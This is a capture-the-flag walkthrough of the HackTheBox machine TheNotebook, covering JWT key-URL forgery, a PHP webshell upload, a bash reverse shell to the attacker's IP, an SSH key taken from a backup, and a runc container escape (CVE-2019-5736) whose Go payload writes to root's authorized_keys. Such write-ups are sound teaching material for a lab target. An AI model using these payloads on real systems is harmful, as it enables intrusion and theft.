---
title: HTB: TheNotebook
url: https://0xdf.gitlab.io/2021/07/31/htb-thenotebook.html
date: 2021-07-31T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-thenotebook, hackthebox, nmap, feroxbuster, jwt, jwt-io, upload, webshell, cve-2019-5736, runc, docker, golang
---

![TheNotebook](https://0xdfimages.gitlab.io/img/thenotebook-cover.png)

TheNotebook starts off with a website where I’ll abuse a JWT misconfiguration to convince the server to validate my token using a key hosted on my server. From there, I’ll get access to a site where I can upload a PHP webshell and get execution. After finding an SSH key in a backup, I’ll exploit a vulnerability in runc, the executable that underlies Docker to get execution as the root user in the host.

## Box Info

| Name | [TheNotebook](https://hackthebox.com/machines/thenotebook)  [TheNotebook](https://hackthebox.com/machines/thenotebook) [Play on HackTheBox](https://hackthebox.com/machines/thenotebook) |
| --- | --- |
| Release Date | [06 Mar 2021](https://twitter.com/hackthebox_eu/status/1367128202607534082) |
| Retire Date | 31 Jul 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for TheNotebook |
| Radar Graph | Radar chart for TheNotebook |
| First Blood User | 00:27:39[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 00:48:43[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [mostwanted002 mostwanted002](https://app.hackthebox.com/users/120514) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 17:20 EDT
Warning: 10.10.10.230 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.230
Host is up (0.11s latency).
Not shown: 65504 closed ports, 29 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 141.20 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans
/nmap-tcpscripts 10.10.10.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 17:24 EDT
Nmap scan report for 10.10.10.230
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 Bionic.

### Website - TCP 80

#### Site

The site is a note taking application:

![image-20210721174251566](https://0xdfimages.gitlab.io/img/image-20210721174251566.png)

The Log In link leads to `/login`, and presents a form:

![image-20210721180003749](https://0xdfimages.gitlab.io/img/image-20210721180003749.png)

The login form will allow me to enumerate users. When I try admin/admin:

![image-20210721180358669](https://0xdfimages.gitlab.io/img/image-20210721180358669.png)

When I try 0xdf/0xdf:

![image-20210721180417661](https://0xdfimages.gitlab.io/img/image-20210721180417661.png)

Still wasn’t able to do much with that at this point.

The register link (`/register`) gives another form:

![image-20210721180457723](https://0xdfimages.gitlab.io/img/image-20210721180457723.png)

On submitting, it returns a logged in page:

![image-20210721180525411](https://0xdfimages.gitlab.io/img/image-20210721180525411.png)

The Notes link goes to `/f101e435-1f44-42cd-a7cc-28a99da1df24/notes`. I’m guessing that guid is associated with my account. I don’t have any notes:

![image-20210721180624540](https://0xdfimages.gitlab.io/img/image-20210721180624540.png)

I can add one using the link and the form it brings up:

![image-20210721180705596](https://0xdfimages.gitlab.io/img/image-20210721180705596.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.230

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.230
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       33l      104w     1422c http://10.10.10.230/register
200       31l       94w     1250c http://10.10.10.230/login
302        4l       24w      209c http://10.10.10.230/logout
403        1l        1w        9c http://10.10.10.230/admin
[####################] - 1m     29999/29999   0s      found:4       errors:0      
[####################] - 1m     29999/29999   478/s   http://10.10.10.230

```

The only thing new is `/admin`, and visiting just returns Forbidden:

```

oxdf@parrot$ curl -v http://10.10.10.230/admin
*   Trying 10.10.10.230:80...
* Connected to 10.10.10.230 (10.10.10.230) port 80 (#0)
> GET /admin HTTP/1.1
> Host: 10.10.10.230
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 FORBIDDEN
< Server: nginx/1.14.0 (Ubuntu)
< Date: Thu, 22 Jul 2021 00:42:50 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 9
< Connection: keep-alive
< 
* Connection #0 to host 10.10.10.230 left intact
Forbidden

```

#### Tech Stack

The HTTP headers don’t give much, only NGINX:

```

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 21 Jul 2021 22:08:19 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 1903

```

Based on all the HTTP endpoints having no extension, I can guess that this is a Python or Ruby framework, but it’s really hard to say for sure.

After a POST to `/register`, there are two `Set-Cookie` headers in the response:

```

HTTP/1.1 302 FOUND
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 21 Jul 2021 22:08:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://10.10.10.230/
Connection: close
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6IjB4ZGYiLCJlbWFpbCI6IjB4ZGZAaHRiIiwiYWRtaW5fY2FwIjowfQ.nyB0Zhrh0NrxjCR2uVyhnaF2oS4ddoYrw2_zahX878mmZfszaBnDsVuicfSs7asfEgFPTlP8uMkonlcVDwynhpreL7VkuHYT4r2JGwhwWi5oqo0uwr80ecWA6VqtNRY95zwvX2hWsN8TWlWewkLW5qy0etAgUTBuZHshB_3E44_uMjh6h314Wiv_KRhTw14k5PPPvRMTWc3HCLhtyDbrxAHa36rpJqmmH1ZSEnHriq-YOOhsyC7oRZ53cHxuVJ3Qmzo0TsLQBjT9RfEuy-SfMJ2ev7wrs3YTOAGXQpb2k8iadOL3MipSP4RMeW-Bsb03ZNEu3GiCD5znhSvBoLL2ijL92LJdkz8lLsNl-R4bPZZwPg4PFxZRgoDxEDh5eOAdjvgpr2RgTJTU-C3lyRva5vyQmsXEt3sAow8BzJNvbZZroMSbwlFmd9-W7GVFUcAYS3fo--SyK3CAuMN4bTE9sAZ2YaAbHmt2P2DepiBeDwfLMMKANuf5GpeGVzW3dZ1KcQljlqawPmtLXCA06TNcAgjm34b8mE3eUtq4ifcbLQWZ6J5Td9e1kg-sUs7v0GgdVNAtcSp4MAw6r_OL0fVO-GFPYTr_dLNOXsxZR6kf5_QHsad30NueWpkfBv95_vDaumJtlsh1grRsUo2ukVIQofh2xM0HCXcw0nyH9UdJcZY; Path=/
Set-Cookie: uuid=f101e435-1f44-42cd-a7cc-28a99da1df24; Path=/

```

The UUID matches the path I was given to my notes. The number of possible UUIDs like this is big enough that if they are randomly generated, I won’t be able to brute force someone else’s path.

The `auth` cookie looks like a JWT. I’ll throw it into [jwt.io](https://jwt.io/):

[![image-20210721203250181](https://0xdfimages.gitlab.io/img/image-20210721203250181.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210721203250181.png)

The data gives my username and email, as well as what I can guess is a flag that says if the user is an administrator, `admin_cap`. The header part shows it’s using asymmetric key pairs for signing, and gives a URL for the kid. In this case, it’s hitting localhost port 7070 to get the private key.

## Shell as www-data

### Gain Admin Access

Because I can change the header information in the JWT, I’ll try giving it a `kid` of my host instead of the local box. A secure server would reject anything that isn’t on localhost (or some other specifically whitelisted host), but forgetting that is not an uncommon mistake.

I’m going to generate my own key to host, and then generate a JWT that points to that key, so it will then validate.

I’ll generate a key using `openssl`:

```

oxdf@parrot$ openssl genrsa -out priv.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
.........................................................................+++++
....................................................................+++++
e is 65537 (0x010001)

```

Now I’ll host that key using a Python webserver (`python3 -m http.server 80`).

I’ll generate a JWT token that uses my private key:

[![image-20210721204535967](https://0xdfimages.gitlab.io/img/image-20210721204535967.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210721204535967.png)

I’ve updated the `kid` to point to my server. I’ve changed `admin_cap` to 1, and I’ve signed it with my private key.

I’ll go into Firefox dev tools in the Storage section and replace the current `auth` key with this one, and refresh at `/admin`. There’s a request for `priv.key` at my Python webserver, and the page shows it’s no longer forbidden:

![image-20210721204644223](https://0xdfimages.gitlab.io/img/image-20210721204644223.png)

In fact, the link to the Admin Panel has been added at the nav bar.

Interestingly, in the Notes link, it still shows the single note associated with my UUID. But the link in Admin Panel –> View Notes goes to `/admin/viewnotes`, where I see all the notes on the server:

![image-20210721204830563](https://0xdfimages.gitlab.io/img/image-20210721204830563.png)

### Enumeration as Admin

There are two hints in the notes from the admin:
- PHP files are being executed (despite this server clearly not being PHP).
- The server has regular backups scheduled.

The more interesting link is the Upload File link, which leads to a form:

![image-20210721205056448](https://0xdfimages.gitlab.io/img/image-20210721205056448.png)

I first tried to upload a plain text file, `test.txt`:

![image-20210726115027912](https://0xdfimages.gitlab.io/img/image-20210726115027912.png)

It changes the filename, but not the extension. However, the View link is broken, as it returns 404. That’s really odd.

### Webshell Execution

Because the note said that PHP files were being executed, I’ll upload a simple PHP webshell:

```

<?php system($_REQUEST["cmd"]); ?>

```

It shows up with a long hex filename, but with the same extension:

![image-20210721210609334](https://0xdfimages.gitlab.io/img/image-20210721210609334.png)

With `.php`, the View link does work, and if i add `?cmd=id` to the end, it show I have execution:

![image-20210721210648992](https://0xdfimages.gitlab.io/img/image-20210721210648992.png)

I’ll look at what’s going on with the webserver in [Beyond Root](#beyond-root).

I like to use `curl` to trigger web shells and that works too:

```

oxdf@parrot$ curl --data-urlencode 'cmd=id' -G -s http://10.10.10.230/a1ba6293840f8a8fb4d5dda74c98c90a.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

To get a shell from that, I’ll start `nc` listening and replace `id` with a reverse shell payload:

```

oxdf@parrot$ curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'" -G -s http://10.10.10.230/a1ba6293840f8a8fb4d5dda74c98c90a.php

```

`curl` just hangs, but at `nc` there’s a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.230] 59216
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
www-data@thenotebook:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade my shell using the `script` / `stty` trick (`python` and `pty` work as well):

```

www-data@thenotebook:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@thenotebook:~/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@thenotebook:~/html$ 

```

## Shell as noah

### Enumeration

I’m dropped into `~/html` (which is `/var/www/html`), but the only file there is my webshell:

```

www-data@thenotebook:~/html$ ls -l
total 4
-rw-r--r-- 1 root root 35 Jul 22 01:15 a1ba6293840f8a8fb4d5dda74c98c90a.php

```

This is really weird, and I’ll dig into it in [Beyond Root](#beyond-root).

`ifconfig` does show that I’m on the host machine (10.10.10.230), but also that there’s a Docker network:

```

www-data@thenotebook:~/html$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:91:98:d2:78  txqueuelen 0  (Ethernet)
        RX packets 164784  bytes 22121111 (22.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 198504  bytes 16853611 (16.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.230  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:15:df  txqueuelen 1000  (Ethernet)
        RX packets 771921  bytes 49768345 (49.7 MB)
        RX errors 0  dropped 113  overruns 0  frame 0
        TX packets 777487  bytes 56653765 (56.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisio
...[snip]...

```

There’s only one home directory, noah:

```

www-data@thenotebook:/home$ ls
noah
www-data@thenotebook:/home$ ls -la noah/
total 36
drwxr-xr-x 5 noah noah 4096 Feb 23 08:57 .
drwxr-xr-x 3 root root 4096 Feb 19 13:49 ..
lrwxrwxrwx 1 root root    9 Feb 17 09:03 .bash_history -> /dev/null
-rw-r--r-- 1 noah noah  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 noah noah 3771 Apr  4  2018 .bashrc
drwx------ 2 noah noah 4096 Feb 19 13:49 .cache
drwx------ 3 noah noah 4096 Feb 19 13:49 .gnupg
-rw-r--r-- 1 noah noah  807 Apr  4  2018 .profile
drwx------ 2 noah noah 4096 Feb 19 13:49 .ssh
lrwxrwxrwx 1 noah noah    9 Feb 23 08:57 .viminfo -> /dev/null
-r-------- 1 noah noah   33 Jul 21 21:21 user.txt

```

`user.txt` is there, but I can’t read it as www-data.

Given the note about backups, I’ll checkout `/var/backups`:

```

www-data@thenotebook:/var/backups$ ls -l
total 52
-rw-r--r-- 1 root root 33252 Feb 24 08:53 apt.extended_states.0
-rw-r--r-- 1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz
-rw-r--r-- 1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz
-rw-r--r-- 1 root root  4373 Feb 17 09:02 home.tar.gz

```

These are all owned by root, but world readable. I’m not so much interested in the `apt`-related ones, but `home.tar.gz` could be interesting. I’ll list the files inside:

```

www-data@thenotebook:/var/backups$ tar -tvf home.tar.gz 
drwxr-xr-x root/root         0 2021-02-12 06:24 home/
drwxr-xr-x noah/noah         0 2021-02-17 09:02 home/noah/
-rw-r--r-- noah/noah       220 2018-04-04 18:30 home/noah/.bash_logout
drwx------ noah/noah         0 2021-02-16 10:47 home/noah/.cache/
-rw-r--r-- noah/noah         0 2021-02-16 10:47 home/noah/.cache/motd.legal-displayed
drwx------ noah/noah         0 2021-02-12 06:25 home/noah/.gnupg/
drwx------ noah/noah         0 2021-02-12 06:25 home/noah/.gnupg/private-keys-v1.d/
-rw-r--r-- noah/noah      3771 2018-04-04 18:30 home/noah/.bashrc
-rw-r--r-- noah/noah       807 2018-04-04 18:30 home/noah/.profile
drwx------ noah/noah         0 2021-02-17 08:59 home/noah/.ssh/
-rw------- noah/noah      1679 2021-02-17 08:59 home/noah/.ssh/id_rsa
-rw-r--r-- noah/noah       398 2021-02-17 08:59 home/noah/.ssh/authorized_keys
-rw-r--r-- noah/noah       398 2021-02-17 08:59 home/noah/.ssh/id_rsa.pub

```

It looks to be noah’s home directory, and there’s a private key in `.ssh`. I’ll read the key from the archive (without extracting it to disk first to not make a mess):

```

www-data@thenotebook:/var/backups$ tar xf home.tar.gz -O home/noah/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
...[snip]...
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----

```

### SSH

The key works to SSH as noah:

```

oxdf@parrot$ ssh -i ~/keys/thenotebook_noah noah@10.10.10.230
...[snip]...
noah@thenotebook:~$ 

```

And I can grab the `user.txt`:

```

noah@thenotebook:~$ cat user.txt
68aa2b88************************

```

## Shell as root

### Enumeration

noah can run `sudo` to run `docker` as root to start a specific set of containers:

```

noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*

```

When looking at this, the important thing to look at is the version of Docker running:

```

noah@thenotebook:~$ docker -v
Docker version 18.06.0-ce, build 0ffa825

```

### CVE-2019-5736

#### Theory

There’s a vulnerability in the version of `runc` used by Docker before 18.09.2 ([CVE-2019-5736](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)) which allows at attacker to overwrite the host `runc` binary from access as root inside a container, and thus gives host root access. [This post from Unit42](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) does a really good job of breaking it down in detail.

The idea is that from within the container, I’ll overwrite `/bin/sh` with `#!/proc/self/exe`, which is a symbolic link to the binary that started the container process. Next, I’ll write to the `runc` binary (which is shared on the host), and have it point to the payload.

Now, when someone tries to initiate a container (ie, runs `docker exec` from the host), the payload will execute on the host as root.

#### Practice

There are tons of POCs out there, but I really like [this one](https://github.com/Frichetten/CVE-2019-5736-PoC). It’s a simple Go script, which I’ll save on my system. At line 15-16, there’s the payload that will be executed:

```

// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"

```

I’ll change that to write my SSH key to `/root/.ssh/authorized_keys`:

```

var payload = "#!/bin/bash \n mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' > /root/.ssh/authorized_keys" 

```

I’ll build the ELF with `go build cve-2019-5673.go`, and now there’s an executable:

```

oxdf@parrot$ file cve-2019-5673
cve-2019-5673: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=mhd4P3-cWrPAeCPFcvJR/6R7blmjNRY_26eSCPvqf/Q8QS3RaPp3UjsdNjgEha/h2Fafwkir7K48YtCpYjM, not stripped

```

I’ll want two shells on TheNotebook as noah, which is easy with SSH. In the first, I’ll drop into the container and upload the binary:

```

noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash
root@97f932ea172b:/opt/webapp# wget 10.10.14.19/cve-2019-5673
--2021-07-22 02:17:33--  http://10.10.14.19/cve-2019-5673
Connecting to 10.10.14.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2140295 (2.0M) [application/octet-stream]
Saving to: ‘cve-2019-5673’

cve-2019-5673                100%[==============================================>]   2.04M  4.21MB/s    in 0.5s    

2021-07-22 02:17:34 (4.21 MB/s) - ‘cve-2019-5673’ saved [2140295/2140295]

```

I’ll make it executable, and run it:

```

root@97f932ea172b:/opt/webapp# chmod +x cve-2019-5673 
root@97f932ea172b:/opt/webapp# ./cve-2019-5673 
[+] Overwritten /bin/sh successfully

```

It hangs after reporting that `/bin/sh` was successfully overwritten. It’s waiting for someone to try to run `runc`. In the second window, I’ll run `docker exec` again:

```

noah@thenotebook:~$ sudo docker exec -it webapp-dev01 /bin/sh
No help topic for '/bin/sh'

```

It returns a weird error, but as soon as I run it, more prints in the first window:

```

root@97f932ea172b:/opt/webapp# ./cve-2019-5673 
[+] Overwritten /bin/sh successfully
[+] Found the PID: 73
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc000460060}

```

My SSH key was just written to root’s `authorized_keys` file, and I can connect over SSH:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.230
...[snip]...
root@thenotebook:~#

```

And grab `root.txt`:

```

root@thenotebook:~# cat root.txt
377123cb************************

```

## Beyond Root

When I landed on the host, I found the PHP backdoor I uploaded, but nothing else of the website, and wanted to see how it worked. It’s a really interesting exercise, and I’d encourage you to take a minute and map it out before reading my solution. I’ve learned a ton with these kinds of config explorations.

I know from the HTTP response headers that the service listening on TCP 80 is claiming to be NGINX, so I’ll check out the config in `/etc/nginx/sites-enabled/`:

```

root@thenotebook:/etc/nginx/sites-enabled# ls 
default

```

There’s a single site, `default`, with the following config:

```

server {
        listen 80 default_server;
        root /var/www/html;
        server_name _;
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        }
        location / {
                proxy_pass http://127.0.0.1:8080/;
        }
}

```

The webserver root is `/var/www/html`, which is the typical default. There are two directives. The first, `location ~ \.php$` will match on anything ending with `.php`, and send it to be handled by PHP. Given the web root, this will execute files in `/var/www/html` ending with `.php`.

The second directive is `location /`. It will match on everything else, and proxy it to localhost port 8080.

Looking at `netstat`, TCP 8080 is listening by `docker-proxy`:

```

root@thenotebook:/etc/nginx/sites-enabled# netstat -tnlp 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      1819/docker-proxy   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1379/nginx: master  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1399/sshd           
tcp        0      0 10.10.10.230:10010      0.0.0.0:*               LISTEN      1466/docker-contain

```

As root, I can list the running containers:

```

root@thenotebook:/etc/nginx/sites-enabled# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                      NAMES
5476eed475cb        webapp              "/bin/bash"              11 hours ago        Up 11 hours         8080/tcp                   webapp-dev01
a0585127364a        webapp              "/bin/sh -c 'python …"   5 months ago        Up 16 hours         127.0.0.1:8080->8080/tcp   webapp

```

The second one, webapp, shows that it’s listening on localhost 8080 and forwarding it to 8080 inside the container. The first one is also listening on 8080, but without the forward from the host.

The remaining question is how does my PHP upload end up on the host and not in the container?

`docker inspect webapp` will print the entire config for the running container. It’s too much to include here in full, but some highlights.

The contain is running a simple HTTP server listening on 7070 and then using `gunicorn` to run `main:app` listening on port 8080:

```

"Path": "/bin/sh",
"Args": [
    "-c",
    "python -m http.server 7070& gunicorn main:app -b 0.0.0.0:8080 -w 4"
],

```

I’ll remember that 7070 is the service hosting the private key for JWT verification. I suspect the `privKey.key` is in that directory.

There’s a `bind`, which is a folder from the host that’s mapped into the container:

```

"Mounts": [
    {
        "Type": "bind",
        "Source": "/var/www/html",
        "Destination": "/opt/webapp/admin/files",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate" 
    },

```

That’s a good clue. If the webapp is saving files to `/opt/webapp/admin/files/` in the container, that’s `/var/www/html` outside it. This is kind of a strange setup, but Docker leads to odd things.

I’ll drop into the container and check it out:

```

root@thenotebook:/etc/nginx/sites-enabled# docker exec -it webapp bash
root@a0585127364a:/opt/webapp#

```

The current directory is `/opt/webapp`.

```

root@a0585127364a:/opt/webapp# ls
__pycache__  admin  create_db.py  main.py  privKey.key  requirements.txt  static  templates  webapp.tar.gz

```

`main.py` is the guts of the Flask application. It create the flask application and config:

```

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/webapp.db'                
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = './admin/files/'
db = SQLAlchemy(app)                                                              
hasher = SHA3_256.new() 

```

Then it defines the different routes of the webapp. For example, `/admin/upload`:

```

@app.route('/admin/upload', methods=["GET", "POST"])
def upload():
    listOfFiles = os.listdir(app.config['UPLOAD_FOLDER'])
    isSignedIn, isAdmin, user = checkSession(request.cookies.get('auth'))
    if isSignedIn and isAdmin:
        if request.method == "GET":
            return (
                render_template("upload.html", signedIn=isSignedIn, isAdmin=isAdmin, listOfFiles=listOfFiles, user=user,
                                error=None))
        elif request.method == "POST":
            if request.files['file'].filename == '':
                return (render_template("upload.html", error="No file specified.", signedIn=isSignedIn, isAdmin=isAdmin,
                                        listOfFiles=listOfFiles, user=user))
            file = request.files['file']
            data = file.read()
            filename = secureFilename(data) + file.filename[file.filename.rindex('.'):]
            with open(os.path.join(app.config['UPLOAD_FOLDER'] + filename), 'wb') as f:
                f.write(data)
                f.close()
            return redirect(url_for('upload'))
    else:
        return "Forbidden", 403

```

It is reading and writing files to the path defined as `app.config['UPLOAD_FOLDER']`, which I noticed above is `./admin/files`.

Putting that all together, the picture looks like:

![image-20210722094034330](https://0xdfimages.gitlab.io/img/image-20210722094034330.png)